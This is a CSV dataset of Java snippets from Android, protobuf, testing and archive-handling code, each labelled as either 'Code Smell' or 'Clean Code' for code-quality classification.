text,label,text_label
"void setState(@State int state){
  setState(state,true);
}
private void setState(@State int state,boolean animation){
  if (null == mSearchBar || null == mSearchBarMover || null == mViewTransition || null == mSearchLayout) {
    return;
  }
  if (mState != state) {
    int oldState=mState;
    mState=state;
switch (oldState) {
case STATE_NORMAL:
      if (state == STATE_SIMPLE_SEARCH) {
        mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
 else       if (state == STATE_SEARCH) {
        mViewTransition.showView(1,animation);
        mSearchLayout.scrollSearchContainerToTop();
        mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
 else       if (state == STATE_SEARCH_SHOW_LIST) {
        mViewTransition.showView(1,animation);
        mSearchLayout.scrollSearchContainerToTop();
        mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
    break;
case STATE_SIMPLE_SEARCH:
  if (state == STATE_NORMAL) {
    mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
    mSearchBarMover.returnSearchBarPosition();
    selectActionFab(animation);
  }
 else   if (state == STATE_SEARCH) {
    mViewTransition.showView(1,animation);
    mSearchLayout.scrollSearchContainerToTop();
    mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
    mSearchBarMover.returnSearchBarPosition();
  }
 else   if (state == STATE_SEARCH_SHOW_LIST) {
    mViewTransition.showView(1,animation);
    mSearchLayout.scrollSearchContainerToTop();
    mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
    mSearchBarMover.returnSearchBarPosition();
  }
break;
case STATE_SEARCH:
if (state == STATE_NORMAL) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
mSearchBarMover.returnSearchBarPosition();
selectActionFab(animation);
}
 else if (state == STATE_SIMPLE_SEARCH) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
 else if (state == STATE_SEARCH_SHOW_LIST) {
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
break;
case STATE_SEARCH_SHOW_LIST:
if (state == STATE_NORMAL) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
mSearchBarMover.returnSearchBarPosition();
selectActionFab(animation);
}
 else if (state == STATE_SIMPLE_SEARCH) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
 else if (state == STATE_SEARCH) {
mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
mSearchBarMover.returnSearchBarPosition();
}
break;
}
}
}",1,Code Smell
"public GProRetentionGuildListRsp(){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
}
public GProRetentionGuildListRsp(ArrayList<GProRetentionChannelInfo> arrayList,int i2,byte[] bArr,boolean z){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
  this.recommendChannels=arrayList;
  this.nextTs=i2;
  this.cookies=bArr;
  this.isEnd=z;
}",0,Clean Code
"public static RollRogueBuffScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),data).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.tree.protos.LeafNodeProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.tree.protos.LeafNodeProto other=(org.tribuo.common.tree.protos.LeafNodeProto)obj;
  if (getParentIdx() != other.getParentIdx())   return false;
  if (getCurIdx() != other.getCurIdx())   return false;
  if (java.lang.Double.doubleToLongBits(getImpurity()) != java.lang.Double.doubleToLongBits(other.getImpurity()))   return false;
  if (hasOutput() != other.hasOutput())   return false;
  if (hasOutput()) {
    if (!getOutput().equals(other.getOutput()))     return false;
  }
  if (!internalGetScore().equals(other.internalGetScore()))   return false;
  if (getGeneratesProbabilities() != other.getGeneratesProbabilities())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public FarmStageGachaInfo clone(){
  return new FarmStageGachaInfo().copyFrom(this);
}
",0,Clean Code
"private boolean isCollapseMiuiTitleApps(){
  return mPrefsMap.getStringAsInt(""various_collapse_miui_title"",0) != 0 && collapseMiuiTitleApps.contains(mPackageName);
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(worldLevel);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(wave);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(cocoonId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(propEntityId);
  }
  return size;
}",0,Clean Code
"public LocalStackContainer(DockerImageName dockerImageName){
  super(dockerImageName);
  withCreateContainerCmdModifier(cmd -> cmd.withEntrypoint(""sh""));
  setCommand(""-c"",""while [ ! -f "" + STARTER_SCRIPT + "" ]; do sleep 0.1; done; ""+ STARTER_SCRIPT);
  withEnv(""LOCALSTACK_HOST"",""localhost.localstack.cloud"");
  withEnv(""SERVICES"",""opensearch"");
}",0,Clean Code
"/** 
 * Start preloading the widget.
 */
private boolean preloadWidget(){
  final LauncherAppWidgetProviderInfo pInfo=mInfo.info;
  if (pInfo.isCustomWidget()) {
    return false;
  }
  final Bundle options=mInfo.getDefaultSizeOptions(mLauncher);
  if (mInfo.getHandler().needsConfigure()) {
    mInfo.bindOptions=options;
    return false;
  }
  mBindWidgetRunnable=new Runnable(){
    @Override public void run(){
      mWidgetLoadingId=mLauncher.getAppWidgetHolder().allocateAppWidgetId();
      if (LOGD) {
        Log.d(TAG,""Binding widget, id: "" + mWidgetLoadingId);
      }
      if (new WidgetManagerHelper(mLauncher).bindAppWidgetIdIfAllowed(mWidgetLoadingId,pInfo,options)) {
        mHandler.post(mInflateWidgetRunnable);
      }
    }
  }
;
  mInflateWidgetRunnable=new Runnable(){
    @Override public void run(){
      if (LOGD) {
        Log.d(TAG,""Inflating widget, id: "" + mWidgetLoadingId);
      }
      if (mWidgetLoadingId == -1) {
        return;
      }
      AppWidgetHostView hostView=mLauncher.getAppWidgetHolder().createView((Context)mLauncher,mWidgetLoadingId,pInfo);
      mInfo.boundWidget=hostView;
      mWidgetLoadingId=-1;
      hostView.setVisibility(View.INVISIBLE);
      int[] unScaledSize=mLauncher.getWorkspace().estimateItemSize(mInfo);
      DragLayer.LayoutParams lp=new DragLayer.LayoutParams(unScaledSize[0],unScaledSize[1]);
      lp.x=lp.y=0;
      lp.customPosition=true;
      hostView.setLayoutParams(lp);
      if (LOGD) {
        Log.d(TAG,""Adding host view to drag layer"");
      }
      mLauncher.getDragLayer().addView(hostView);
      mView.setTag(mInfo);
    }
  }
;
  if (LOGD) {
    Log.d(TAG,""About to bind/inflate widget"");
  }
  mHandler.post(mBindWidgetRunnable);
  return true;
}",0,Clean Code
"@Override public SingleCallGraphRootTreeNode getRootNode(){
  return (SingleCallGraphRootTreeNode)getAbstractRootNode();
}
",0,Clean Code
"@Override protected Boolean computeValue(Class<?> type){
  try {
    return (boolean)IS_RECORD.invoke(type);
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected RecordComponent[] computeValue(Class<?> type){
  try {
    MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
    Object[] components=(Object[])GET_RECORD_COMPONENTS.invoke(type);
    RecordComponent[] recordComponents=new RecordComponent[components.length];
    for (int i=0; i < components.length; i++) {
      Object component=components[i];
      Method accessor=(Method)GET_ACCESSOR.invoke(component);
      Class<?> fieldType=(Class<?>)GET_TYPE.invoke(component);
      MethodHandle handle=lookup.unreflect(accessor);
      Object getter=_JDKAccess.makeGetterFunction(lookup,handle,fieldType);
      recordComponents[i]=new RecordComponent((Class<?>)GET_DECLARING_RECORD.invoke(component),(String)GET_NAME.invoke(component),fieldType,(Type)GET_GENERIC_TYPE.invoke(component),accessor,getter);
    }
    return recordComponents;
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected Tuple2<Constructor,MethodHandle> computeValue(Class<?> type){
  RecordComponent[] components=RecordUtils.getRecordComponents(type);
  if (components == null) {
    return null;
  }
  Class<?>[] paramTypes=Arrays.stream(components).map(RecordComponent::getType).toArray(Class<?>[]::new);
  Constructor constructor;
  try {
    constructor=type.getDeclaredConstructor(paramTypes);
  }
 catch (  NoSuchMethodException e) {
    throw new RuntimeException(e);
  }
  MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
  if (lookup != null) {
    try {
      MethodHandle handle=lookup.findConstructor(type,MethodType.methodType(void.class,paramTypes));
      return Tuple2.of(constructor,handle);
    }
 catch (    NoSuchMethodException|IllegalAccessException e) {
      return Tuple2.of(constructor,null);
    }
  }
 else {
    return Tuple2.of(constructor,null);
  }
}",0,Clean Code
"public static SceneEntityInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),data).checkInitialized();
}
public static SceneEntityInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
public static SceneEntityInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
",0,Clean Code
"public String getBytesReserveInfo(){
  return this.bytesReserveInfo;
}
",0,Clean Code
"@Override public void removedNode(final ZyGraphNode<? extends IViewNode<?>> removedNode){
  for (int j=0; j < getChildCount(); ++j) {
    final SelectionHistoryTreeNode leaf=(SelectionHistoryTreeNode)getChildAt(j);
    if (leaf.getNode() == removedNode) {
      ((DefaultTreeModel)getTree().getModel()).removeNodeFromParent(leaf);
      leaf.removeFromParent();
      setUserObject(new SelectionHistoryTreeNodeWrapper(snapshot,snapshotCount));
      break;
    }
  }
}",0,Clean Code
"@Bean public TitanEmbeddingBedrockApi titanEmbeddingApi(){
  return new TitanEmbeddingBedrockApi(TitanEmbeddingModel.TITAN_EMBED_IMAGE_V1.id(),EnvironmentVariableCredentialsProvider.create(),Region.US_EAST_1.id(),new ObjectMapper(),Duration.ofMinutes(2));
}",0,Clean Code
"@Override public void writeTo(ProtoSink output) throws IOException {
  output.writeRawBytes(data);
}
",0,Clean Code
"void setSelected(boolean selected);
",0,Clean Code
"@Override public void init(){
  mPackageManagerService=findClassIfExists(""com.android.server.pm.PackageManagerService"");
  findAndHookMethod(mPackageManagerService,""systemReady"",new MethodHook(){
    @Override protected void after(    MethodHookParam param) throws Throwable {
      Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
      Handler mHandler=(Handler)XposedHelpers.getObjectField(param.thisObject,""mHandler"");
      new PrefsChangeObserver(mContext,mHandler,""prefs_key_system_framework_clean_share_apps""){
        @Override public void onChange(        String name){
          mPrefsMap.put(name,PrefsUtils.getSharedStringSetPrefs(mContext,name));
        }
      }
;
    }
  }
);
  MethodHook hook=new MethodHook(){
    @Override @SuppressWarnings(""unchecked"") protected void after(    MethodHookParam param) throws Throwable {
      try {
        if (param.args[0] == null)         return;
        Intent origIntent=(Intent)param.args[0];
        String action=origIntent.getAction();
        if (action == null)         return;
        if (!action.equals(Intent.ACTION_SEND) && !action.equals(Intent.ACTION_SENDTO) && !action.equals(Intent.ACTION_SEND_MULTIPLE))         return;
        Intent intent=(Intent)origIntent.clone();
        if (intent.getDataString() != null && intent.getDataString().contains("":""))         return;
        if (intent.hasExtra(""HyperCeiler"") && intent.getBooleanExtra(""HyperCeiler"",false))         return;
        Set<String> selectedApps=mPrefsMap.getStringSet(""system_framework_clean_share_apps"");
        List<ResolveInfo> resolved=(List<ResolveInfo>)param.getResult();
        ResolveInfo resolveInfo;
        Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        PackageManager pm=mContext.getPackageManager();
        Iterator<ResolveInfo> itr=resolved.iterator();
        while (itr.hasNext()) {
          resolveInfo=itr.next();
          boolean removeOriginal=selectedApps.contains(resolveInfo.activityInfo.packageName) || selectedApps.contains(resolveInfo.activityInfo.packageName + ""|0"");
          boolean removeDual=selectedApps.contains(resolveInfo.activityInfo.packageName + ""|999"");
          boolean hasDual=false;
          try {
            hasDual=XposedHelpers.callMethod(pm,""getPackageInfoAsUser"",resolveInfo.activityInfo.packageName,0,999) != null;
          }
 catch (          Throwable ignore) {
          }
          if ((removeOriginal && !hasDual) || removeOriginal && hasDual && removeDual)           itr.remove();
        }
        param.setResult(resolved);
      }
 catch (      Throwable t) {
        if (!(t instanceof BadParcelableException))         logE(TAG,CleanShareMenu.this.lpparam.packageName,t);
      }
    }
  }
;
  String ActQueryService=isMoreAndroidVersion(33) ? ""com.android.server.pm.ComputerEngine"" : ""com.android.server.pm.PackageManagerService$ComputerEngine"";
  hookAllMethods(ActQueryService,lpparam.classLoader,""queryIntentActivitiesInternal"",hook);
}",0,Clean Code
"public RedisMetadataDAO(JedisProxy jedisProxy,ObjectMapper objectMapper,ConductorProperties conductorProperties,RedisProperties properties){
  super(jedisProxy,objectMapper,conductorProperties,properties);
  refreshTaskDefs();
  long cacheRefreshTime=properties.getTaskDefCacheRefreshInterval().getSeconds();
  Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(this::refreshTaskDefs,cacheRefreshTime,cacheRefreshTime,TimeUnit.SECONDS);
}
",0,Clean Code
"/** 
 * Build the input streams consisting of all-zero input streams and non-zero input streams. When reading from the non-zero input streams, the data is actually read from the original input stream. The size of each input stream is introduced by the sparse headers. NOTE : Some all-zero input streams and non-zero input streams have the size of 0. We DO NOT store the 0 size input streams because they are meaningless.
 */
private void buildSparseInputStreams() throws IOException {
  currentSparseInputStreamIndex=-1;
  sparseInputStreams=new ArrayList<>();
  final List<TarArchiveStructSparse> sparseHeaders=currEntry.getSparseHeaders();
  if (sparseHeaders != null && sparseHeaders.size() > 1) {
    final Comparator<TarArchiveStructSparse> sparseHeaderComparator=(p,q) -> {
      final Long pOffset=p.getOffset();
      final Long qOffset=q.getOffset();
      return pOffset.compareTo(qOffset);
    }
;
    Collections.sort(sparseHeaders,sparseHeaderComparator);
  }
  if (sparseHeaders != null) {
    final InputStream zeroInputStream=new TarArchiveSparseZeroInputStream();
    long offset=0;
    for (    final TarArchiveStructSparse sparseHeader : sparseHeaders) {
      if (sparseHeader.getOffset() == 0 && sparseHeader.getNumbytes() == 0) {
        break;
      }
      if ((sparseHeader.getOffset() - offset) < 0) {
        throw new IOException(""Corrupted struct sparse detected"");
      }
      if ((sparseHeader.getOffset() - offset) > 0) {
        sparseInputStreams.add(new BoundedInputStream(zeroInputStream,sparseHeader.getOffset() - offset));
      }
      if (sparseHeader.getNumbytes() > 0) {
        sparseInputStreams.add(new BoundedInputStream(inputStream,sparseHeader.getNumbytes()));
      }
      offset=sparseHeader.getOffset() + sparseHeader.getNumbytes();
    }
  }
  if (!sparseInputStreams.isEmpty()) {
    currentSparseInputStreamIndex=0;
  }
}",0,Clean Code
"@TruffleBoundary public final boolean startsWith(VmCollection other){
  if (getLength() < other.getLength())   return false;
  var iter=iterator();
  var otherIter=other.iterator();
  while (otherIter.hasNext()) {
    if (!iter.next().equals(otherIter.next()))     return false;
  }
  return true;
}
",0,Clean Code
